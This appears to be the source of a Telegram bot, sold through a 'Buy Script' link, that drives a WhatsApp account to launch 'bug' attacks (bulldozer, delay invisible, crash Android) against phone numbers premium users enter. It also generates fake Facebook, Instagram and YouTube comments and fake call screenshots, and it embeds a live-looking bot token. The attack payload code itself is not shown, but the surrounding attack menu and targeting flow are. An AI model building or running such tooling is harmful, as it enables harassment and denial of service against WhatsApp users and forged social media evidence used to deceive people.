const axios = require('axios');
const express = require("express");
const fs = require("fs");
const cors = require("cors");
const path = require("path");
const { Boom } = require("@hapi/boom");
const chalk = require("chalk");
const pino = require("pino");
const readline = require("readline");
const TelegramBot = require('node-telegram-bot-api');
const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const { 
  default: baileys, 
  proto, 
  getContentType, 
  generateWAMessage, 
  generateWAMessageContent,
  prepareWAMessageMedia, 
  generateWAMessageFromContent,    
  downloadContentFromMessage
} = require("@whiskeysockets/baileys");

const KONTOL_TOKEN = "8087352968:AAHFUSJVz1HiMYe-OOr42Befg89GK8U7AeY";
const OWNER_IDS = [5075315883, 66666666, 1111111111, 1111111111, 1111111111, 1111111111];

const PREMIUM_FILE = "./premium.json";
const COOLDOWN_FILE = "./cooldown.json";

// Inisialisasi file
if (!fs.existsSync(PREMIUM_FILE)) {
  fs.writeFileSync(PREMIUM_FILE, JSON.stringify([], null, 2));
}
if (!fs.existsSync(COOLDOWN_FILE)) {
  fs.writeFileSync(COOLDOWN_FILE, JSON.stringify({}, null, 2));
}

function getPremiumUsers() {
  return JSON.parse(fs.readFileSync(PREMIUM_FILE, "utf8"));
}

function savePremiumUsers(premiumUsers) {
  fs.writeFileSync(PREMIUM_FILE, JSON.stringify(premiumUsers, null, 2));
}

function getCooldown() {
  return JSON.parse(fs.readFileSync(COOLDOWN_FILE, "utf8"));
}

function saveCooldown(cooldown) {
  fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(cooldown, null, 2));
}

function isPremium(userId) {
  const premiumUsers = getPremiumUsers();
  return premiumUsers.includes(parseInt(userId));
}

function isOwner(userId) {
  return OWNER_IDS.includes(parseInt(userId));
}

function getUserStatus(userId) {
  if (isOwner(userId)) return "developer";
  if (isPremium(userId)) return "premium";
  return "free";
}

// Sistem cooldown (5 detik)
function setCooldown(userId) {
  const cooldown = getCooldown();
  cooldown[userId] = Date.now() + (5 * 1000); // 5 detik
  saveCooldown(cooldown);
}

function isInCooldown(userId) {
  const cooldown = getCooldown();
  if (!cooldown[userId]) return false;
  
  if (Date.now() > cooldown[userId]) {
    delete cooldown[userId];
    saveCooldown(cooldown);
    return false;
  }
  
  return true;
}

function getCooldownTime(userId) {
  const cooldown = getCooldown();
  if (!cooldown[userId]) return 0;
  
  const remaining = cooldown[userId] - Date.now();
  return Math.ceil(remaining / 1000); // dalam detik
}

// Sistem spam protection
const userRequestCount = {};
const MAX_REQUESTS_PER_MINUTE = 10;

function isSpamming(userId) {
  const now = Date.now();
  const minute = Math.floor(now / 60000);
  
  if (!userRequestCount[userId]) {
    userRequestCount[userId] = { count: 1, minute: minute };
    return false;
  }
  
  if (userRequestCount[userId].minute !== minute) {
    userRequestCount[userId] = { count: 1, minute: minute };
    return false;
  }
  
  userRequestCount[userId].count++;
  
  if (userRequestCount[userId].count > MAX_REQUESTS_PER_MINUTE) {
    return true;
  }
  
  return false;
}

// Fungsi normalisasi nomor
function normalizePhoneNumber(phone) {
  // Hapus semua karakter non-digit kecuali +
  let normalized = phone.replace(/[^\d+]/g, '');
  
  // Jika diawali dengan 0, ganti dengan 62
  if (normalized.startsWith('0')) {
    normalized = '62' + normalized.substring(1);
  }
  
  // Jika diawali dengan +62, hapus +
  if (normalized.startsWith('+62')) {
    normalized = '62' + normalized.substring(3);
  }
  
  // Pastikan diawali dengan 62
  if (!normalized.startsWith('62')) {
    normalized = '62' + normalized;
  }
  
  return normalized;
}

// Fungsi validasi nomor yang lebih fleksibel
function isValidPhoneNumber(phone) {
  // Hapus semua karakter non-digit untuk validasi
  const cleanPhone = phone.replace(/[^\d]/g, '');
  
  // Minimal 10 digit, maksimal 15 digit setelah 62
  if (cleanPhone.length < 10 || cleanPhone.length > 15) {
    return false;
  }
  
  // Pastikan diawali dengan 62
  if (!cleanPhone.startsWith('62')) {
    return false;
  }
  
  return true;
}

const telegramBot = new TelegramBot(KONTOL_TOKEN, { polling: true });

// State untuk /startbug
const userStates = {};

telegramBot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  const userId = msg.from.id;
  const username = msg.from.username || 'Tidak ada username';
  
  if (!text) return;

  // Anti spam
  if (isSpamming(userId)) {
    return telegramBot.sendMessage(chatId, "❌ Terlalu banyak request! Tunggu 1 menit sebelum request lagi.");
  }

  // === FITUR OWNER/DEVELOPER ===
  if (text.startsWith('/addprem') || text.startsWith('/delprem') || text.startsWith('/listprem') || text.startsWith('/pairing')) {
    if (!OWNER_IDS.includes(userId)) {
      return telegramBot.sendMessage(chatId, "❌ Akses ini hanya untuk developer!");
    }
  }

  // === FITUR PREMIUM - SEMUA ATTACK HANYA UNTUK PREMIUM ===
  if (text.startsWith('/bulldozer') || text.startsWith('/delayinvis') || text.startsWith('/protocolys') || 
      text.startsWith('/jesjdjjdjjjd') || text.startsWith('/hshhhheehe') || text.startsWith('/euhjeejjejeue') ||
      text.startsWith('/iqc') || text.startsWith('/ustad') || text.startsWith('/nulis') || text === '/startbug') {
    if (!isPremium(userId) && !isOwner(userId)) {
      return telegramBot.sendMessage(chatId, "Lu siapa bego😂");
    }
  }

  if (text === '/start') {
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
    const botUsername = "𝗦𝗺𝗼𝗼𝘁𝗵 𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻";
    const userStatus = getUserStatus(userId);
    
    const startCaption = `―( 𑀟 ) Wssp bro ${username}!
Let me introduce myself, my name is 𝗦𝗺𝗼𝗼𝘁𝗵 𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻.
Welcome, it's nice to meet you. Enjoy your time!

<blockquote>𝗦𝘁𝗮𝘁𝗶𝘀𝘁𝗶𝗸 𝗜𝗻𝗳𝗼</blockquote>
• Total User: ${Object.keys(userRequestCount).length}
• Total Sender: ${getPremiumUsers().length}
• Language: JavaScript

<blockquote>𝗣𝗿𝗼𝘁𝗲𝗰𝘁𝗶𝗼𝗻 𝗜𝗻𝗳𝗼</blockquote>
• Cooldown killer
• High suspend location
• Automatically leave the group
• Detection spam users
• Inappropriate speech detection
• adjust the user's language`;

    telegramBot.sendPhoto(chatId, "https://files.catbox.moe/nww41k.jpg", {
      caption: startCaption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Buy Script",
              url: "https://t.me/XBhigh"
            }
          ]
        ]
      }
    });
}
  
  if (text === '/menu') {
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
    const startCaption = `―( 𑀟 ) Wssp bro ${username}!
Let me introduce myself, my name is 𝗦𝗺𝗼𝗼𝘁𝗵 𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻.
Welcome, it's nice to meet you. Enjoy your time!
    
<blockquote>𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 𝗠𝗲𝗻𝘂</blockquote>
• /addprem uid ⇆ Add
• /delprem uid ⇆ Hapus 
• /listprem ⇆ List premium
• /pairing ⇆ Pairing sender

<blockquote>𝗕𝘂𝗴 𝗠𝗲𝗻𝘂</blockquote>
• /startbug ⇆ Start Bug Attack
• /bulldozer 62xxx ⇆ Attack
• /delayinvis 62xxx ⇆ Attack
• /protocolys 62xxx ⇆ Attack

<blockquote>𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂</blockquote>
• /info ⇆ Info user
• /iqc text ⇆ I-Phone
• /ustad text ⇆ Quest Ustad
• /ustadv2 text ⇆ Ustad V2
• /nulis text ⇆ Automatic
• /fakecall nama ⇆ Fake Call
• /fakefb nama,komen ⇆ Fake Facebook
• /fakeinsta username,caption ⇆ Fake Instagram 
• /fakeyt username,komen ⇆ Fake YouTube
`;

    telegramBot.sendPhoto(chatId, "https://files.catbox.moe/nww41k.jpg", {
      caption: startCaption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Support",
              url: "https://t.me/XBhigh"
            }
          ]
        ]
      }
    });

  } else if (text === '/info') {
    const userStatus = getUserStatus(userId);
    const firstName = msg.from.first_name || 'User';
    const lastName = msg.from.last_name || '';
    const fullName = `${firstName} ${lastName}`.trim();

    const infoCaption = `
<blockquote>User Info</blockquote>
Name: ${fullName}
Username: @${username}

<blockquote>Account</blockquote>
Gmail: Private
Password: *******

ID Telegram: <code>${userId}</code>
Status: ${userStatus.toUpperCase()}`;

    telegramBot.sendPhoto(chatId, "https://files.catbox.moe/dnb52j.jpg", {
        caption: infoCaption,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: "Profile User",
                        url: `https://t.me/${username}`
                    }
                ]
            ]
        }
    });

  }
  
  
  else if (text === '/getseason') {
    if (!isOwner(userId)) {
        return telegramBot.sendMessage(chatId, "❌ Akses ini hanya untuk developer!");
    }

    try {
        const loadingMsg = await telegramBot.sendMessage(chatId, "📦 Membuat file season...");
        
        // Cek apakah folder session ada
        const sessionDir = './session';
        if (!fs.existsSync(sessionDir)) {
            await telegramBot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
            return telegramBot.sendMessage(chatId, "❌ Folder session tidak ditemukan!");
        }

        // Kirim file-file session satu per satu
        const files = fs.readdirSync(sessionDir);
        const sessionFiles = files.filter(file => 
            fs.statSync(path.join(sessionDir, file)).isFile()
        );

        if (sessionFiles.length === 0) {
            await telegramBot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
            return telegramBot.sendMessage(chatId, "❌ Tidak ada file session ditemukan!");
        }

        await telegramBot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

        // Kirim info dulu
        await telegramBot.sendMessage(chatId, 
            `📁 *SESSION FILES*\n\n` +
            `• Total files: ${sessionFiles.length}\n` +
            `• Folder: session/\n` +
            `• Date: ${new Date().toLocaleString()}`,
            { parse_mode: 'Markdown' }
        );

        // Kirim setiap file session
        for (const file of sessionFiles) {
            try {
                const filePath = path.join(sessionDir, file);
                const fileBuffer = fs.readFileSync(filePath);
                const fileSize = (fileBuffer.length / 1024).toFixed(2);
                
                await telegramBot.sendDocument(chatId, fileBuffer, {}, {
                    filename: file,
                    contentType: 'application/octet-stream'
                });
                
                console.log(`📤 Sent: ${file} (${fileSize} KB)`);
                
                // Delay antar file untuk avoid flood
                await sleep(1000);
                
            } catch (fileError) {
                console.error(`Error sending ${file}:`, fileError);
                await telegramBot.sendMessage(chatId, `❌ Gagal mengirim file: ${file}`);
            }
        }

        // Kirim summary
        await telegramBot.sendMessage(chatId, 
            `✅ *SEMUA FILE SESSION TELAH DIKIRIM*\n\n` +
            `• Total: ${sessionFiles.length} files\n` +
            `• Status: Completed\n` +
            `• Time: ${new Date().toLocaleString()}`,
            { parse_mode: 'Markdown' }
        );

    } catch (error) {
        console.error('Error getseason:', error);
        telegramBot.sendMessage(chatId, "❌ Gagal membuat file season: " + error.message);
    }
}

else if (text === '/deleteseason') {
    if (!isOwner(userId)) {
        return telegramBot.sendMessage(chatId, "❌ Akses ini hanya untuk developer!");
    }

    try {
        const sessionDir = './session';
        
        if (!fs.existsSync(sessionDir)) {
            return telegramBot.sendMessage(chatId, "❌ Folder session tidak ditemukan!");
        }

        // Konfirmasi delete
        const confirmMessage = await telegramBot.sendMessage(chatId, 
            "⚠️ *HAPUS SEASON* ⚠️\n\n" +
            "Anda yakin ingin menghapus semua file session?\n" +
            "Tindakan ini tidak dapat dibatalkan!\n\n" +
            "Ketik /confirmdelete untuk konfirmasi",
            { parse_mode: 'Markdown' }
        );

        // Simpan state konfirmasi
        userStates[userId] = { 
            step: 'confirm_delete_season',
            confirmMessageId: confirmMessage.message_id 
        };

        // Auto delete pesan konfirmasi setelah 30 detik
        setTimeout(async () => {
            if (userStates[userId] && userStates[userId].step === 'confirm_delete_season') {
                delete userStates[userId];
                try {
                    await telegramBot.deleteMessage(chatId, confirmMessage.message_id);
                    await telegramBot.sendMessage(chatId, "❌ Waktu konfirmasi habis! Season tidak dihapus.");
                } catch (e) {}
            }
        }, 30000);

    } catch (error) {
        console.error('Error deleteseason:', error);
        telegramBot.sendMessage(chatId, "❌ Gagal memproses perintah: " + error.message);
    }
}


else if (text === '/confirmdelete') {
    if (userStates[userId] && userStates[userId].step === 'confirm_delete_season') {
        try {
            const sessionDir = './session';
            
            // Hapus pesan konfirmasi
            await telegramBot.deleteMessage(chatId, userStates[userId].confirmMessageId).catch(() => {});
            delete userStates[userId];

            const loadingMsg = await telegramBot.sendMessage(chatId, "🗑️ Menghapus session...");
            
            // Fungsi hapus folder recursive
            const deleteFolderRecursive = function(folderPath) {
                if (fs.existsSync(folderPath)) {
                    fs.readdirSync(folderPath).forEach((file) => {
                        const curPath = path.join(folderPath, file);
                        if (fs.lstatSync(curPath).isDirectory()) {
                            // Hapus subfolder
                            deleteFolderRecursive(curPath);
                        } else {
                            // Hapus file
                            fs.unlinkSync(curPath);
                            console.log(`🗑️ Deleted: ${curPath}`);
                        }
                    });
                    // Hapus folder utama
                    fs.rmdirSync(folderPath);
                }
            };

            // Hapus session folder
            deleteFolderRecursive(sessionDir);
            
            await telegramBot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
            
            telegramBot.sendMessage(chatId, 
                "✅ *Season berhasil dihapus!*\n\n" +
                "Semua file session telah dihapus.\n" +
                "Bot akan restart otomatis...",
                { parse_mode: 'Markdown' }
            );

            // Restart bot setelah 3 detik
            setTimeout(() => {
                console.log('🔄 Restarting bot setelah delete season...');
                process.exit(0);
            }, 3000);

        } catch (error) {
            console.error('Error deleting season:', error);
            telegramBot.sendMessage(chatId, "❌ Gagal menghapus season: " + error.message);
        }
    } else {
        telegramBot.sendMessage(chatId, "❌ Tidak ada permintaan hapus season yang aktif!");
    }
}

  
  // Tambahkan di bagian handler message, setelah fakeyt
 else if (text.startsWith('/ustadv2 ')) {
    const query = text.replace('/ustadv2 ', '').trim();
    
    if (!query) {
        return telegramBot.sendMessage(chatId, "❌ Format: /ustadv2 <text>\nContoh: /ustadv2 Jangan lupa sholat 5 waktu");
    }

    // Cek status premium
    if (!isPremium(userId) && !isOwner(userId)) {
        return telegramBot.sendMessage(chatId, "Lu siapa bego😂");
    }

    // Cek cooldown
    if (isInCooldown(userId)) {
        const cooldownTime = getCooldownTime(userId);
        return telegramBot.sendMessage(chatId, `❌ Tunggu ${cooldownTime} detik sebelum menggunakan ustadv2 lagi.`);
    }

    try {
        const loadingMsg = await telegramBot.sendMessage(chatId, "🤪");
        
        // Encode parameter untuk URL
        const encodedText = encodeURIComponent(query);
        const apiUrl = `https://api.zenzxz.my.id/api/maker/ustadz2?text=${encodedText}`;
        
        // Download gambar dari API
        const response = await axios({
            method: 'GET',
            url: apiUrl,
            responseType: 'arraybuffer'
        });

        await telegramBot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

        // Kirim sebagai photo
        await telegramBot.sendPhoto(chatId, Buffer.from(response.data), {
            caption: `✅ Ustad V2 Berhasil!\n• Text: ${query}\n• Status: Premium Feature`,
            parse_mode: "HTML"
        });

        // Set cooldown
        setCooldown(userId);

    } catch (error) {
        console.error('Error ustadv2:', error);
        
        let errorMessage = "❌ Gagal membuat gambar ustad v2";
        if (error.response) {
            errorMessage += `: API Error ${error.response.status}`;
        } else if (error.request) {
            errorMessage += ": Tidak bisa terhubung ke server";
        } else {
            errorMessage += `: ${error.message}`;
        }
        
        telegramBot.sendMessage(chatId, errorMessage);
    }
}
  
  // Tambahkan di bagian handler message, setelah fakefb
 else if (text.startsWith('/fakeinsta ')) {
    const input = text.replace('/fakeinsta ', '').trim();
    
    // Split username dan caption dengan koma
    const parts = input.split(',');
    
    if (parts.length < 2) {
        return telegramBot.sendMessage(chatId, "❌ Format: /fakeinsta <username>,<caption>\nContoh: /fakeinsta johndoe,Liburan seru banget! 🌴");
    }

    const username = parts[0].trim();
    const caption = parts.slice(1).join(',').trim(); // Gabungkan kembali jika ada koma di caption

    if (!username || !caption) {
        return telegramBot.sendMessage(chatId, "❌ Format: /fakeinsta <username>,<caption>\nContoh: /fakeinsta johndoe,Liburan seru banget! 🌴");
    }

    // Cek status premium
    if (!isPremium(userId) && !isOwner(userId)) {
        return telegramBot.sendMessage(chatId, "Lu siapa bego😂");
    }

    // Cek cooldown
    if (isInCooldown(userId)) {
        const cooldownTime = getCooldownTime(userId);
        return telegramBot.sendMessage(chatId, `❌ Tunggu ${cooldownTime} detik sebelum menggunakan fakeinsta lagi.`);
    }

    try {
        const loadingMsg = await telegramBot.sendMessage(chatId, "🤪");
        
        // Encode parameter untuk URL
        const encodedUsername = encodeURIComponent(username);
        const encodedCaption = encodeURIComponent(caption);
        const apiUrl = `https://api.zenzxz.my.id/api/maker/fakestory?username=${encodedUsername}&caption=${encodedCaption}&ppurl=https%3A%2F%2Ffiles.catbox.moe%2F7e4y9f.jpg`;
        
        // Download gambar dari API
        const response = await axios({
            method: 'GET',
            url: apiUrl,
            responseType: 'arraybuffer'
        });

        await telegramBot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

        // Kirim sebagai photo
        await telegramBot.sendPhoto(chatId, Buffer.from(response.data), {
            caption: `✅ Fake Instagram Story Berhasil!\n• Username: ${username}\n• Caption: ${caption}\n• Status: Premium Feature`,
            parse_mode: "HTML"
        });

        // Set cooldown
        setCooldown(userId);

    } catch (error) {
        console.error('Error fakeinsta:', error);
        
        let errorMessage = "❌ Gagal membuat fake Instagram story";
        if (error.response) {
            errorMessage += `: API Error ${error.response.status}`;
        } else if (error.request) {
            errorMessage += ": Tidak bisa terhubung ke server";
        } else {
            errorMessage += `: ${error.message}`;
        }
        
        telegramBot.sendMessage(chatId, errorMessage);
    }
}


// Tambahkan di bagian handler message, setelah fakeinsta
 else if (text.startsWith('/fakeyt ')) {
    const input = text.replace('/fakeyt ', '').trim();
    
    // Split username dan komen dengan koma
    const parts = input.split(',');
    
    if (parts.length < 2) {
        return telegramBot.sendMessage(chatId, "❌ Format: /fakeyt <username>,<komen>\nContoh: /fakeyt GamingChannel,Video keren banget! 👍");
    }

    const username = parts[0].trim();
    const komen = parts.slice(1).join(',').trim(); // Gabungkan kembali jika ada koma di komen

    if (!username || !komen) {
        return telegramBot.sendMessage(chatId, "❌ Format: /fakeyt <username>,<komen>\nContoh: /fakeyt GamingChannel,Video keren banget! 👍");
    }

    // Cek status premium
    if (!isPremium(userId) && !isOwner(userId)) {
        return telegramBot.sendMessage(chatId, "Lu siapa bego😂");
    }

    // Cek cooldown
    if (isInCooldown(userId)) {
        const cooldownTime = getCooldownTime(userId);
        return telegramBot.sendMessage(chatId, `❌ Tunggu ${cooldownTime} detik sebelum menggunakan fakeyt lagi.`);
    }

    try {
        const loadingMsg = await telegramBot.sendMessage(chatId, "💥");
        
        // Encode parameter untuk URL
        const encodedUsername = encodeURIComponent(username);
        const encodedKomen = encodeURIComponent(komen);
        const apiUrl = `https://api.zenzxz.my.id/api/maker/ytcomment?text=${encodedKomen}&avatar=https%3A%2F%2Ffiles.catbox.moe%2F7e4y9f.jpg&username=${encodedUsername}`;
        
        // Download gambar dari API
        const response = await axios({
            method: 'GET',
            url: apiUrl,
            responseType: 'arraybuffer'
        });

        await telegramBot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

        // Kirim sebagai photo
        await telegramBot.sendPhoto(chatId, Buffer.from(response.data), {
            caption: `✅ Fake YouTube Comment Berhasil!\n• Username: ${username}\n• Komentar: ${komen}\n• Status: Premium Feature`,
            parse_mode: "HTML"
        });

        // Set cooldown
        setCooldown(userId);

    } catch (error) {
        console.error('Error fakeyt:', error);
        
        let errorMessage = "❌ Gagal membuat fake YouTube comment";
        if (error.response) {
            errorMessage += `: API Error ${error.response.status}`;
        } else if (error.request) {
            errorMessage += ": Tidak bisa terhubung ke server";
        } else {
            errorMessage += `: ${error.message}`;
        }
        
        telegramBot.sendMessage(chatId, errorMessage);
    }
}
  
  // Tambahkan di bagian handler message, setelah fakecall
  else if (text.startsWith('/fakefb ')) {
    const input = text.replace('/fakefb ', '').trim();
    
    // Split nama dan komen dengan koma
    const parts = input.split(',');
    
    if (parts.length < 2) {
        return telegramBot.sendMessage(chatId, "❌ Format: /fakefb <nama>,<komen>\nContoh: /fakefb John Doe,Ini komen mantap");
    }

    const nama = parts[0].trim();
    const komen = parts.slice(1).join(',').trim(); // Gabungkan kembali jika ada koma di komen

    if (!nama || !komen) {
        return telegramBot.sendMessage(chatId, "❌ Format: /fakefb <nama>,<komen>\nContoh: /fakefb John Doe,Ini komen mantap");
    }

    // Cek status premium
    if (!isPremium(userId) && !isOwner(userId)) {
        return telegramBot.sendMessage(chatId, "Lu siapa bego😂");
    }

    // Cek cooldown
    if (isInCooldown(userId)) {
        const cooldownTime = getCooldownTime(userId);
        return telegramBot.sendMessage(chatId, `❌ Tunggu ${cooldownTime} detik sebelum menggunakan fakefb lagi.`);
    }

    try {
        const loadingMsg = await telegramBot.sendMessage(chatId, "🤪");
        
        // Encode parameter untuk URL
        const encodedNama = encodeURIComponent(nama);
        const encodedKomen = encodeURIComponent(komen);
        const apiUrl = `https://api.zenzxz.my.id/api/maker/fakefb?name=${encodedNama}&comment=${encodedKomen}&ppurl=https%3A%2F%2Ffiles.catbox.moe%2F7e4y9f.jpg`;
        
        // Download gambar dari API
        const response = await axios({
            method: 'GET',
            url: apiUrl,
            responseType: 'arraybuffer'
        });

        await telegramBot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

        // Kirim sebagai photo
        await telegramBot.sendPhoto(chatId, Buffer.from(response.data), {
            caption: `✅ Fake Facebook Comment Berhasil!\n• Nama: ${nama}\n• Komentar: ${komen}\n• Status: Premium Feature`,
            parse_mode: "HTML"
        });

        // Set cooldown
        setCooldown(userId);

    } catch (error) {
        console.error('Error fakefb:', error);
        
        let errorMessage = "❌ Gagal membuat fake Facebook comment";
        if (error.response) {
            errorMessage += `: API Error ${error.response.status}`;
        } else if (error.request) {
            errorMessage += ": Tidak bisa terhubung ke server";
        } else {
            errorMessage += `: ${error.message}`;
        }
        
        telegramBot.sendMessage(chatId, errorMessage);
    }
}
  
   // Tambahkan di bagian handler message
 else if (text.startsWith('/fakecall ')) {
    const nama = text.replace('/fakecall ', '').trim();
    
    if (!nama) {
        return telegramBot.sendMessage(chatId, "❌ Format: /fakecall <nama>");
    }

    // Cek status premium
    if (!isPremium(userId) && !isOwner(userId)) {
        return telegramBot.sendMessage(chatId, "Lu siapa bego😂");
    }

    // Cek cooldown
    if (isInCooldown(userId)) {
        const cooldownTime = getCooldownTime(userId);
        return telegramBot.sendMessage(chatId, `❌ Tunggu ${cooldownTime} detik sebelum menggunakan fakecall lagi.`);
    }

    try {
        const loadingMsg = await telegramBot.sendMessage(chatId, "🤪");
        
        // Encode nama untuk URL
        const encodedNama = encodeURIComponent(nama);
        const apiUrl = `https://api.zenzxz.my.id/api/maker/fakecall?nama=${encodedNama}&durasi=00.01&avatar=https%3A%2F%2Ffiles.catbox.moe%2F7e4y9f.jpg`;
        
        // Download gambar dari API
        const response = await axios({
            method: 'GET',
            url: apiUrl,
            responseType: 'arraybuffer'
        });

        await telegramBot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

        // Kirim sebagai photo (karena API menghasilkan gambar)
        await telegramBot.sendPhoto(chatId, Buffer.from(response.data), {
            caption: `✅ Fake Call Berhasil!\n• Nama: ${nama}\n• Durasi: 00:01\n• Status: Premium Feature`,
            parse_mode: "HTML"
        });

        // Set cooldown
        setCooldown(userId);

    } catch (error) {
        console.error('Error fakecall:', error);
        
        let errorMessage = "❌ Gagal membuat fakecall";
        if (error.response) {
            errorMessage += `: API Error ${error.response.status}`;
        } else if (error.request) {
            errorMessage += ": Tidak bisa terhubung ke server";
        } else {
            errorMessage += `: ${error.message}`;
        }
        
        telegramBot.sendMessage(chatId, errorMessage);
    }
}
     else if (text === '/startbug') {
    // Cek cooldown
    if (isInCooldown(userId)) {
      const cooldownTime = getCooldownTime(userId);
      return telegramBot.sendMessage(chatId, `❌ Tunggu ${cooldownTime} detik sebelum menggunakan bug lagi.`);
    }

    userStates[userId] = { step: 'waiting_number' };
    
    const sentMsg = await telegramBot.sendMessage(chatId, `Kirimkan nomer target +62 xxx xxx`, {
      parse_mode: 'Markdown'
    });
    
    // Auto delete pesan setelah 30 detik jika tidak ada respon
    setTimeout(async () => {
      if (userStates[userId] && userStates[userId].step === 'waiting_number') {
        delete userStates[userId];
        try {
          await telegramBot.deleteMessage(chatId, sentMsg.message_id);
          await telegramBot.sendMessage(chatId, " Waktu habis! Gunakan /startbug lagi.");
        } catch (e) {}
      }
    }, 30000);

  } else if (userStates[userId] && userStates[userId].step === 'waiting_number') {
    // Validasi nomor yang lebih fleksibel
    const numberInput = text.trim();
    
    if (!isValidPhoneNumber(numberInput)) {
      const errorMsg = await telegramBot.sendMessage(chatId, `❌ Format nomor tidak valid!\n\nContoh yang benar:\n621223383838383\n+62122338383838\n081234567890\n\nCoba lagi dengan nomor yang valid.`);
      
      // Auto delete pesan error setelah 8 detik
      setTimeout(async () => {
        try {
          await telegramBot.deleteMessage(chatId, errorMsg.message_id);
        } catch (e) {}
      }, 8000);
      
      return;
    }
    
    // Normalisasi nomor
    const normalizedNumber = normalizePhoneNumber(numberInput);
    userStates[userId].number = normalizedNumber;
    userStates[userId].step = 'waiting_type';
    
    const typeMessage = await telegramBot.sendMessage(chatId, `Selected type bug`, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "⛶ Bulldozer", callback_data: `bug_bulldozer_${normalizedNumber}` },
            { text: "⛶ Delay Invisible", callback_data: `bug_delayinvis_${normalizedNumber}` }
          ],
          [
            { text: "⛶ Crash Andro", callback_data: `bug_bulldozer_${normalizedNumber}` },
            { text: "⛶ Protocoll Hours", callback_data: `bug_protocolys_${normalizedNumber}` }
          ]
        ]
      }
    });
    
    // Auto delete setelah 30 detik
    setTimeout(async () => {
      if (userStates[userId] && userStates[userId].step === 'waiting_type') {
        delete userStates[userId];
        try {
          await telegramBot.deleteMessage(chatId, typeMessage.message_id);
          await telegramBot.sendMessage(chatId, "❌ Waktu habis! Gunakan /startbug lagi.");
        } catch (e) {}
      }
    }, 30000);

  } else if (text.startsWith('/addprem ')) {
    const targetUserId = text.split(' ')[1];
    if (!targetUserId) {
      return telegramBot.sendMessage(chatId, "❌ Format: /addprem <id_telegram>");
    }

    const premiumUsers = getPremiumUsers();
    const userIdNum = parseInt(targetUserId);
    
    if (premiumUsers.includes(userIdNum)) {
      return telegramBot.sendMessage(chatId, "❌ User sudah premium!");
    }

    premiumUsers.push(userIdNum);
    savePremiumUsers(premiumUsers);
    telegramBot.sendMessage(chatId, `✅ User *${targetUserId}* berhasil ditambahkan ke premium!`, { parse_mode: 'Markdown' });

  } else if (text.startsWith('/delprem ')) {
    const targetUserId = text.split(' ')[1];
    if (!targetUserId) {
      return telegramBot.sendMessage(chatId, "❌ Format: /delprem <id_telegram>");
    }

    const premiumUsers = getPremiumUsers();
    const userIdNum = parseInt(targetUserId);
    const newPremiumUsers = premiumUsers.filter(id => id !== userIdNum);
    
    if (premiumUsers.length === newPremiumUsers.length) {
      return telegramBot.sendMessage(chatId, "❌ User tidak ditemukan di premium list!");
    }

    savePremiumUsers(newPremiumUsers);
    telegramBot.sendMessage(chatId, `✅ User *${targetUserId}* berhasil dihapus dari premium!`, { parse_mode: 'Markdown' });

  } else if (text === '/listprem') {
    const premiumUsers = getPremiumUsers();
    let premiumList = `*Daftar User Premium (${premiumUsers.length})*\n\n`;
    premiumUsers.forEach((id, i) => {
      premiumList += `${i + 1}. ${id}\n`;
    });
    telegramBot.sendMessage(chatId, premiumList, { parse_mode: 'Markdown' });

  } else if (text.startsWith('/pairing ')) {
    const number = text.split(' ')[1];
    if (!number) {
      return telegramBot.sendMessage(chatId, "❌ Format: /pairing 62xxxx");
    }

    if (!waSocket) {
      return telegramBot.sendMessage(chatId, "❌ WA Bot belum siap, tunggu sebentar...");
    }

    try {
      const code = await waSocket.requestPairingCode(number.replace('+', ''));
      telegramBot.sendMessage(chatId, `🔑 Kode Pairing untuk ${number}: \`${code}\``, { parse_mode: 'Markdown' });
    } catch (e) {
      telegramBot.sendMessage(chatId, `❌ Gagal generate pairing: ${e.message}`);
    }

  // === FITUR MAKER PREMIUM ===
  } else if (text.startsWith('/iqc ')) {
    const query = text.replace('/iqc ', '').trim();
    if (!query) {
      return telegramBot.sendMessage(chatId, "❌ Format: /iqc <text>");
    }

    try {
      const loadingMsg = await telegramBot.sendMessage(chatId, "Processing...");
      
      const apiUrl = `https://api.elrayyxml.web.id/api/maker/iqc?text=${encodeURIComponent(query)}`;
      const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
      
      await telegramBot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
      
      telegramBot.sendPhoto(chatId, Buffer.from(response.data), {
        caption: `✅ IQC Image Created\nText: ${query}`,
        parse_mode: "HTML"
      });
      
    } catch (error) {
      telegramBot.sendMessage(chatId, `❌ Gagal membuat gambar IQC: ${error.message}`);
    }

  } else if (text.startsWith('/ustad ')) {
    const query = text.replace('/ustad ', '').trim();
    if (!query) {
      return telegramBot.sendMessage(chatId, "❌ Format: /ustad <text>");
    }

    try {
      const loadingMsg = await telegramBot.sendMessage(chatId, "Processing...");
      
      const apiUrl = `https://api.elrayyxml.web.id/api/maker/ustadz?text=${encodeURIComponent(query)}`;
      const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
      
      await telegramBot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
      
      telegramBot.sendPhoto(chatId, Buffer.from(response.data), {
        caption: `✅ Ustad Image Created\nText: ${query}`,
        parse_mode: "HTML"
      });
      
    } catch (error) {
      telegramBot.sendMessage(chatId, `❌ Gagal membuat gambar ustad: ${error.message}`);
    }

